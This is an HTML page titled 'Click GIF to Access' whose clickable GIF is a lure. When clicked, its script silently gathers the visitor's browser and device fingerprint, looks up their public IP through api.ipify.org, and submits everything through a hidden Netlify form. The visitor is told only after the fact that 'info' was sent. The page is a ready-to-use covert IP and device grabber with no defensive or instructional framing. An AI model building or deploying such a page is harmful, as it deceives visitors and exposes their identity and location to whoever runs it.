<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Click GIF to Access</title>
</head>
<body>
  <h1>Click the GIF to Access</h1>

  <!-- Your GIF -->
  <img id="triggerGif" src="https://i.makeagif.com/media/5-04-2017/Y35b4a.gif" alt="Click to access" style="cursor:pointer; width:300px;">

  <!-- Hidden Netlify form -->
  <form name="device-info" netlify netlify-honeypot="bot-field" hidden>
    <input type="hidden" name="form-name" value="device-info">
    <input type="hidden" name="deviceInfo" id="deviceInfo">
  </form>

<script>
async function gatherDeviceInfo() {
  let info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
    viewport: { width: window.innerWidth, height: window.innerHeight },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    timestamp: new Date().toISOString(),
    ip: null
  };

  try {
    const ipv4 = await fetch("https://api.ipify.org?format=json").then(res => res.json());
    info.ip = ipv4.ip || "Unavailable";
  } catch(e) {
    info.ip = "Unavailable";
  }

  return info;
}

document.getElementById("triggerGif").addEventListener("click", async () => {
  const data = await gatherDeviceInfo();
  document.getElementById("deviceInfo").value = JSON.stringify(data);

  // Submit to Netlify
  const form = document.forms["device-info"];
  fetch("/", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(new FormData(form)).toString()
  })
  .then(() => {
    alert("✅ Info sent successfully.");
  })
  .catch(err => {
    console.error(err);
    alert("❌ Failed to send.");
  });
});
</script>
</body>
</html>